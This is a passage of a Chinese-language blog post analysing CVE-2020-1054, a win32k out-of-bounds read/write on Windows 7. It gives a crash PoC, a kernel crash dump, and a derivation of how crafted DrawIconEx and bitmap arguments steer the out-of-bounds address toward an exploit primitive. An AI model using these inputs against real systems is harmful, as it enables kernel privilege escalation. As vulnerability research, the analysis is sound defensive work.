<!doctype html><html lang="zh"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.0"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta><title>CVE-2020-1054 堆越界读写 - 食兔人的博客</title><meta description="¶基本信息漏洞类型：内存越界读写漏洞漏洞位置：win32k!vStrWrite01+0x36a"><meta property="og:type" content="blog"><meta property="og:title" content="食兔人的博客"><meta property="og:url" content="https://blog.ycdxsb.cn/fe2ed35f.html"><meta property="og:site_name" content="食兔人的博客"><meta property="og:description" content="¶基本信息漏洞类型：内存越界读写漏洞漏洞位置：win32k!vStrWrite01+0x36a"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-28-04-upload_d82779b4879fda1862fce30ef931889b.png"><meta property="og:image" content="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-13-05-830989_QGM29YAZB57J7P4.png"><meta property="og:image" content="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-13-05-830989_5A52H8Z78ZREFU4.png"><meta property="og:image" content="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-13-05-image-20210513114748217.png"><meta property="og:image" content="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-31-03-upload_6c619c03efe57acbb12f556c46175be9.png"><meta property="og:image" content="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-13-05-image-20210513115659924.png"><meta property="og:image" content="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-31-03-upload_c57402a45a6b759e664eb6ee99ee3c1d.png"><meta property="article:published_time" content="2021-05-13T14:14:00.000Z"><meta property="article:modified_time" content="2021-05-13T12:25:17.748Z"><meta property="article:author" content="ycdxsb"><meta property="article:tag" content="research"><meta property="article:tag" content="windows"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-28-04-upload_d82779b4879fda1862fce30ef931889b.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.ycdxsb.cn/fe2ed35f.html"},"headline":"食兔人的博客","image":["https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-28-04-upload_d82779b4879fda1862fce30ef931889b.png","https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-13-05-830989_QGM29YAZB57J7P4.png","https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-13-05-830989_5A52H8Z78ZREFU4.png","https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-13-05-image-20210513114748217.png","https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-31-03-upload_6c619c03efe57acbb12f556c46175be9.png","https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-13-05-image-20210513115659924.png","https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-31-03-upload_c57402a45a6b759e664eb6ee99ee3c1d.png"],"datePublished":"2021-05-13T14:14:00.000Z","dateModified":"2021-05-13T12:25:17.748Z","author":{"@type":"Person","name":"ycdxsb"},"description":"¶基本信息漏洞类型：内存越界读写漏洞漏洞位置：win32k!vStrWrite01+0x36a"}</script><link rel="canonical" href="https://blog.ycdxsb.cn/fe2ed35f.html"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><link rel="alternate" href="/atom.xml" title="食兔人的博客" type="application/atom+xml">
<link rel="alternate" href="/rss2.xml" title="食兔人的博客" type="application/rss+xml">
</head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">食兔人的博客</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" datetime="2021-05-13T14:14:00.000Z" title="2021-05-13T14:14:00.000Z">2021-05-13</time><span class="level-item"> ycdxsb </span><span class="level-item"><a class="link-muted" href="/categories/research/">research</a><span> / </span><a class="link-muted" href="/categories/research/windows/">windows</a></span><span class="level-item">16 分钟 读完 (大约 2344 个字)</span><span class="level-item" id="busuanzi_container_page_pv"><i class="far fa-eye"></i>&nbsp;&nbsp;<span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">CVE-2020-1054 堆越界读写</h1><div class="content"><h3><span id="pji-ben-xin-xi">基本信息</span><a href="#pji-ben-xin-xi" class="header-anchor">#</a></h3><ul><li>漏洞类型：内存越界读写漏洞</li><li>漏洞位置：<code>win32k!vStrWrite01+0x36a</code></li></ul><a id="more"></a><h3><span id="ppoc-fen-xi">PoC 分析</span><a href="#ppoc-fen-xi" class="header-anchor">#</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LoadLibraryA(<span class="string">"user32.dll"</span>);</span><br><span class="line">    HDC r0 = CreateCompatibleDC(<span class="number">0x0</span>); <span class="comment">// 创建一个与指定设备兼容的内存设备上下文环境（DC）</span></span><br><span class="line">    HBITMAP r1 = CreateCompatibleBitmap(r0, <span class="number">0x9f42</span>, <span class="number">0xa</span>); <span class="comment">// 创建与指定的设备环境相关的设备兼容的位图</span></span><br><span class="line">    SelectObject(r0, r1); <span class="comment">// 选择一对象到指定的设备上下文环境中，该新对象替换先前的相同类型的对象。</span></span><br><span class="line">    DrawIconEx(r0, <span class="number">0x0</span>, <span class="number">0x0</span>, (HICON)<span class="number">0x30000010003</span>, <span class="number">0x0</span>, <span class="number">0xfffffffffebffffc</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x6</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">描绘一个图标或鼠标指针。与DrawIcon相比，这个函数提供了更多的功能　非零表示成功，零表示失败。会设置GetLastError</span></span><br><span class="line"><span class="comment">.参数 hdc, 整数型, 要在其中画图的一个设备场景的句柄</span></span><br><span class="line"><span class="comment">.参数 xLeft, 整数型, 图标左上角的位置，用逻辑坐标表示</span></span><br><span class="line"><span class="comment">.参数 yTop, 整数型, 同上</span></span><br><span class="line"><span class="comment">.参数 hIcon, 整数型, 要描绘的图标的句柄</span></span><br><span class="line"><span class="comment">.参数 cxWidth, 整数型, 希望的图标宽度和高度。图标会自动缩放，与指定的值相符</span></span><br><span class="line"><span class="comment">.参数 cyWidth, 整数型, 同上</span></span><br><span class="line"><span class="comment">.参数 istepIfAniCur, 整数型, , 如果hIcon是个动画指针，那么该参数指定描绘动画中的哪幅图象。注意Win32不能区分图标和指针</span></span><br><span class="line"><span class="comment">.参数 hbrFlickerFreeDraw, 整数型, 如设为一个刷子句柄，那么函数会将图标画入一幅内存位图，并用背景色填充。随后，将图象直接复制到指定的位置。这样做可绘图时减少闪烁（因为画图过程中重现）</span></span><br><span class="line"><span class="comment">.参数 diFlags, 整数型, , 下述常数之一：</span></span><br><span class="line"><span class="comment">DI_COMPAT：描绘标准的系统指针，而不是指定的图象</span></span><br><span class="line"><span class="comment">DI_DEFAULTSIZE：忽略cxWidth和cyWidth设置，并采用原始的图标大小</span></span><br><span class="line"><span class="comment">DI_IMAGE：绘图时使用图标的XOR部分（即图标没有透明区域）</span></span><br><span class="line"><span class="comment">DI_MASK：绘图时使用图标的MASK部分（如单独使用，可获得图标的掩模）</span></span><br><span class="line"><span class="comment">DI_NORMAL：用常规方式绘图（合并 DI_IMAGE 和 DI_MASK）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-28-04-upload_d82779b4879fda1862fce30ef931889b.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">NOTE: The trap frame does not contain all registers.</span><br><span class="line">Some register values may be zeroed or incorrect.</span><br><span class="line">rax&#x3D;fffff900c1f7b000 rbx&#x3D;0000000000000000 rcx&#x3D;fffff901c1f7b238</span><br><span class="line">rdx&#x3D;fffff900c00d7420 rsi&#x3D;0000000000000000 rdi&#x3D;0000000000000000</span><br><span class="line">rip&#x3D;fffff9600012218a rsp&#x3D;fffff88006083bd0 rbp&#x3D;0000000000000000</span><br><span class="line"> r8&#x3D;0000000000000020  r9&#x3D;fffff96000080000 r10&#x3D;fffff88006083c30</span><br><span class="line">r11&#x3D;0000000000000000 r12&#x3D;0000000000000000 r13&#x3D;0000000000000000</span><br><span class="line">r14&#x3D;0000000000000000 r15&#x3D;0000000000000000</span><br><span class="line">iopl&#x3D;0         nv up ei ng nz ac po cy</span><br><span class="line">win32k!vStrWrite01+0x36a:</span><br><span class="line">fffff960&#96;0012218a 418b36          mov     esi,dword ptr [r14] ds:00000000&#96;00000000&#x3D;????????</span><br><span class="line">Resetting default scope</span><br><span class="line"></span><br><span class="line">STACK_TEXT:  </span><br><span class="line">fffff880&#96;06083168 fffff800&#96;03fb8d92 : fffff901&#96;c1f7b238 fffffa80&#96;028abb60 00000000&#96;00000065 fffff800&#96;03f0d178 : nt!RtlpBreakWithStatusInstruction</span><br><span class="line">fffff880&#96;06083170 fffff800&#96;03fb9b7e : fffff880&#96;00000003 fffff880&#96;06083a40 fffff800&#96;03f0da20 fffff880&#96;060837d0 : nt!KiBugCheckDebugBreak+0x12</span><br><span class="line">fffff880&#96;060831d0 fffff800&#96;03ed1744 : 00000000&#96;00000000 fffff8a0&#96;02320674 fffff8a0&#96;00020019 fffff800&#96;03edb13d : nt!KeBugCheck2+0x71e</span><br><span class="line">fffff880&#96;060838a0 fffff800&#96;03e7bc6f : 00000000&#96;00000050 fffff901&#96;c1f7b238 00000000&#96;00000000 fffff880&#96;06083a40 : nt!KeBugCheckEx+0x104</span><br><span class="line">fffff880&#96;060838e0 fffff800&#96;03ecf76e : 00000000&#96;00000000 fffff901&#96;c1f7b238 00000000&#96;00000000 00000000&#96;00000000 : nt! ?? ::FNODOBFM::&#96;string&#39;+0x44891</span><br><span class="line">fffff880&#96;06083a40 fffff960&#96;0012218a : fffff880&#96;06084130 fffff960&#96;00132ce5 fffff880&#96;060847a8 fffff960&#96;00106391 : nt!KiPageFault+0x16e</span><br><span class="line">fffff880&#96;06083bd0 fffff960&#96;0011fce6 : fffff900&#96;c0081000 fffff900&#96;c00d7420 fffff900&#96;c1f7b000 fffff880&#96;06084130 : win32k!vStrWrite01+0x36a</span><br><span class="line">fffff880&#96;06083c80 fffff960&#96;00121dd7 : fffff900&#96;c1f7b018 fffff900&#96;c06ac018 00000000&#96;00000000 fffff880&#96;060844f0 : win32k!EngStretchBltNew+0x164a</span><br><span class="line">fffff880&#96;06084210 fffff960&#96;0026914e : 00000000&#96;00000000 fffff900&#96;c06ac018 00000000&#96;00000000 fffff880&#96;060844f0 : win32k!EngStretchBlt+0x797</span><br><span class="line">fffff880&#96;06084340 fffff960&#96;00266b33 : fffff900&#96;c1f7b018 fffff900&#96;c06ac018 00000000&#96;00000000 fffff880&#96;060844f0 : win32k!EngStretchBltROP+0x5fe</span><br><span class="line">fffff880&#96;06084470 fffff960&#96;0026613f : fffff900&#96;c00c0010 00000000&#96;00000000 00000000&#96;00000001 fffff900&#96;00000000 : win32k!BLTRECORD::bStretch+0x623</span><br><span class="line">fffff880&#96;060845c0 fffff960&#96;0017d06f : fffff900&#96;c00b4160 00000000&#96;0c01022d 00000000&#96;00000000 000007fe&#96;fd705000 : win32k!GreStretchBltInternal+0xa37</span><br><span class="line">fffff880&#96;06084860 fffff960&#96;0017d485 : 00000000&#96;00000000 00000000&#96;febffffc fffff900&#96;c00b4160 00000000&#96;00000000 : win32k!BltIcon+0x18f</span><br><span class="line">fffff880&#96;06084910 fffff960&#96;0015693d : 00000000&#96;0c01022d fffff880&#96;00000000 00000000&#96;00000000 00000000&#96;00000000 : win32k!DrawIconEx+0x3b1</span><br><span class="line">fffff880&#96;060849f0 fffff800&#96;03ed08d3 : fffffa80&#96;028abb60 00000000&#96;0013fa38 fffff880&#96;06084a88 00000000&#96;0c01022d : win32k!NtUserDrawIconEx+0x14d</span><br><span class="line">fffff880&#96;06084a70 00000000&#96;76e5526a : 00000000&#96;76e551ff 00000000&#96;00000000 00000000&#96;770b5628 00000000&#96;00340000 : nt!KiSystemServiceCopyEnd+0x13</span><br><span class="line">00000000&#96;0013fa18 00000000&#96;76e551ff : 00000000&#96;00000000 00000000&#96;770b5628 00000000&#96;00340000 00000000&#96;00000001 : USER32!NtUserDrawIconEx+0xa</span><br><span class="line">00000000&#96;0013fa20 00000001&#96;3f2e1075 : 00000000&#96;0c01022d 00000000&#96;00000000 00000000&#96;00000000 00000000&#96;00000000 : USER32!DrawIconEx+0xd9</span><br><span class="line">00000000&#96;0013fae0 00000000&#96;0c01022d : 00000000&#96;00000000 00000000&#96;00000000 00000000&#96;00000000 00000001&#96;00000000 : poc!main+0x75 [c:\users\ycdxsb\desktop\poc\poc\poc.cpp @ 14] </span><br><span class="line">00000000&#96;0013fae8 00000000&#96;00000000 : 00000000&#96;00000000 00000000&#96;00000000 00000001&#96;00000000 00000001&#96;febffffc : 0xc01022d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SYMBOL_NAME:  win32k!vStrWrite01+36a</span><br><span class="line"></span><br><span class="line">IMAGE_VERSION:  6.1.7601.17514</span><br><span class="line"></span><br><span class="line">STACK_COMMAND:  .thread ; .cxr ; kb</span><br><span class="line"></span><br><span class="line">FAILURE_BUCKET_ID:  X64_0x50_win32k!vStrWrite01+36a</span><br><span class="line"></span><br><span class="line">OS_VERSION:  7.1.7601.17514</span><br><span class="line"></span><br><span class="line">BUILDLAB_STR:  win7sp1_rtm</span><br><span class="line"></span><br><span class="line">OSPLATFORM_TYPE:  x64</span><br><span class="line"></span><br><span class="line">OSNAME:  Windows 7</span><br><span class="line"></span><br><span class="line">FAILURE_ID_HASH:  &#123;f2899406-e264-20bf-8eba-e41d212357e9&#125;</span><br><span class="line"></span><br><span class="line">Followup:     MachineOwner</span><br></pre></td></tr></table></figure><p>问题在于<code>Win32k!vStrWrite01+0x36a</code>处，寄存器值发生了错误。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-13-05-830989_QGM29YAZB57J7P4.png" alt="image-20200721103105049"></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-13-05-830989_5A52H8Z78ZREFU4.png" alt="image-20200721104042298"></p><p>可以看到在崩溃处有<code>tmp = *destAddr</code>，同时后面还有<code>*destAddr = tmp</code>的操作，中间有对<code>tmp</code>进行修改，如果控制了崩溃处的<code>destAddr</code>（越界地址oobAddr），那么可以在后面进行内存破坏。</p><h3><span id="pyue-jie-xie-fen-xi">越界写分析</span><a href="#pyue-jie-xie-fen-xi" class="header-anchor">#</a></h3><p>利用原语：</p><ol><li><code>tmp = *destAddr</code>：地址读</li><li><code>*destAddr = tmp</code> ：地址写</li></ol><p>地址计算：</p><p><code>vStrWrite01(struct STRRUN *pStrrun, struct XRUNLEN *a2,struct SURFACE *pSurface, struct CLIPOBJ *a4)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _STRRUN</span><br><span class="line">&#123;</span><br><span class="line">    LONG    yPos;</span><br><span class="line">    LONG    cRep;</span><br><span class="line">    XRUNLEN xrl;</span><br><span class="line">&#125; STRRUN;</span><br><span class="line"></span><br><span class="line">typedef struct _XRUNLEN</span><br><span class="line">&#123;</span><br><span class="line">    LONG    xPos;</span><br><span class="line">    LONG    cRun;</span><br><span class="line">    LONG    aul[1];</span><br><span class="line">&#125; XRUNLEN;</span><br></pre></td></tr></table></figure><p>地址读时的oobAddr值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">oobAddr&#x3D; result + 4 * (pStrrun-&gt;xrl.xPos &gt;&gt; 5);</span><br><span class="line"></span><br><span class="line">result &#x3D; pSurface-&gt;SurfObj.pvScan0 + offset;</span><br><span class="line">offset &#x3D; pStrrun.yPos * pSurface-&gt;SurfObj.lDelta;</span><br></pre></td></tr></table></figure><p>地址写时的oobAddr值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">oobAddr&#x3D; result + 4 (pStrrun-&gt;xrl.xPos &gt;&gt; 5)</span><br><span class="line">          + diff;</span><br><span class="line">diff &#x3D; loopCount * pSurface-&gt;SurfObj.lDelta</span><br></pre></td></tr></table></figure><p>函数大致流程如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">while()&#123;</span><br><span class="line">    do&#123;</span><br><span class="line">    </span><br><span class="line">        destAddr &#x3D; result + 4 * (pStrrun-&gt;xrl.xPos &gt;&gt; 5); &#x2F;&#x2F;读取时的oobAddr</span><br><span class="line">        ....</span><br><span class="line">        tmp &#x3D; *destAddr &#x2F;&#x2F; crash</span><br><span class="line">        </span><br><span class="line">        do&#123;</span><br><span class="line">        </span><br><span class="line">           if()&#123;</span><br><span class="line">               tmp |&#x3D; xxxxxx</span><br><span class="line">           &#125;else&#123;</span><br><span class="line">               tmp &amp;&#x3D; xxxxxx</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;while()</span><br><span class="line">        </span><br><span class="line">        if()&#123;  &#x2F;&#x2F; 满足条件时，写入</span><br><span class="line">            *destAddr &#x3D; tmp;   &#x2F;&#x2F;写入时的oobAddr</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;while()</span><br><span class="line">    result +&#x3D; pSurface-&gt;SurfObj.lDelta; &#x2F;&#x2F;每次循环oobAddr会增加</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>影响读写oobAddr值的有<code>pStrrun-&gt;yPos</code>，<code>pStrrun-&gt;xrl.xPos</code>，<code>pSurface-&gt;SurfObj.lDelta</code>以及循环次数<code>loopCount</code>，可以通过逆向获得具体关系</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">DrawIconEx(exploit_dc, <span class="number">0x900</span>, <span class="number">0xb</span>, (HICON)<span class="number">0x40000010003</span>, <span class="number">0x0</span>, <span class="number">0xffe00000</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">描绘一个图标或鼠标指针。与DrawIcon相比，这个函数提供了更多的功能　非零表示成功，零表示失败。会设置GetLastError</span></span><br><span class="line"><span class="comment">.参数 hdc, 整数型, 要在其中画图的一个设备场景的句柄</span></span><br><span class="line"><span class="comment">.参数 xLeft, 整数型, 图标左上角的位置，用逻辑坐标表示</span></span><br><span class="line"><span class="comment">.参数 yTop, 整数型, 同上</span></span><br><span class="line"><span class="comment">.参数 hIcon, 整数型, 要描绘的图标的句柄</span></span><br><span class="line"><span class="comment">.参数 cxWidth, 整数型, 希望的图标宽度和高度。图标会自动缩放，与指定的值相符</span></span><br><span class="line"><span class="comment">.参数 cyWidth, 整数型, 同上</span></span><br><span class="line"><span class="comment">.参数 istepIfAniCur, 整数型, , 如果hIcon是个动画指针，那么该参数指定描绘动画中的哪幅图象。注意Win32不能区分图标和指针</span></span><br><span class="line"><span class="comment">.参数 hbrFlickerFreeDraw, 整数型, 如设为一个刷子句柄，那么函数会将图标画入一幅内存位图，并用背景色填充。随后，将图象直接复制到指定的位置。这样做可绘图时减少闪烁（因为画图过程中重现）</span></span><br><span class="line"><span class="comment">.参数 diFlags, 整数型, , 下述常数之一：</span></span><br><span class="line"><span class="comment">DI_COMPAT：描绘标准的系统指针，而不是指定的图象</span></span><br><span class="line"><span class="comment">DI_DEFAULTSIZE：忽略cxWidth和cyWidth设置，并采用原始的图标大小</span></span><br><span class="line"><span class="comment">DI_IMAGE：绘图时使用图标的XOR部分（即图标没有透明区域）</span></span><br><span class="line"><span class="comment">DI_MASK：绘图时使用图标的MASK部分（如单独使用，可获得图标的掩模）</span></span><br><span class="line"><span class="comment">DI_NORMAL：用常规方式绘图（合并 DI_IMAGE 和 DI_MASK）</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ul><li><p><code>pStrrun-&gt;yPos</code>:与DrawIconEx中的arg3和arg6有关</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arg3 = <span class="number">0xb</span>;</span><br><span class="line">    <span class="keyword">int</span> arg6 = <span class="number">0xffe00000</span>;</span><br><span class="line">    <span class="keyword">int</span> yPos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> remainder_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> quotient_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> mod_num = (arg3+<span class="number">1</span>-(arg6+arg3+<span class="number">1</span>)) % <span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">int</span> div_num = (arg3+<span class="number">1</span>-(arg6+arg3+<span class="number">1</span>))/ <span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0xf</span>+mod_num&gt;=<span class="number">0x20</span>)&#123;</span><br><span class="line">        remainder_count = mod_num;</span><br><span class="line">        quotient_count = div_num+<span class="number">1</span>;</span><br><span class="line">        yPos = (remainder_count<span class="number">-1</span><span class="number">-1</span>)*(div_num+<span class="number">1</span>) \</span><br><span class="line">              + div_num +arg6 + arg3+<span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        remainder_count = mod_num;</span><br><span class="line">        quotient_count = div_num;</span><br><span class="line">        yPos = (<span class="number">0x20</span><span class="number">-1</span><span class="number">-1</span>)*div_num+arg6+arg3+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"arg3: 0x%x\n"</span>,arg3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"arg6: 0x%x\n"</span>,arg6);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"yPos First: 0x%x\n"</span>,yPos);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"yPos Second: 0x%x\n"</span>,(yPos+quotient_count));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>pStrrun-&gt;xrl.xPos</code>：0x900</p><ul><li>DrawIconEx中的arg2</li></ul></li><li><p><code>pSurface-&gt;SurfObj.lDelta</code>：0xa2a0</p><ul><li>cx/8，cx为CreateCompatibleBitmap中的arg2，也就是0x51500</li><li>CreateCompatibleBitmap(exploit_dc, 0x51500, 0x100);</li></ul></li><li><p><code>loopCount</code>：0xb</p><ul><li>DrawIconEx中的arg3</li></ul></li></ul><p>地址读时的oobAddr:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">oobAddr&#x3D; result + 4 * (pStrrun-&gt;xrl.xPos &gt;&gt; 5);</span><br><span class="line"></span><br><span class="line">result &#x3D; pSurface-&gt;SurfObj.pvScan0 + offset </span><br><span class="line">offset &#x3D; pStrrun.yPos * 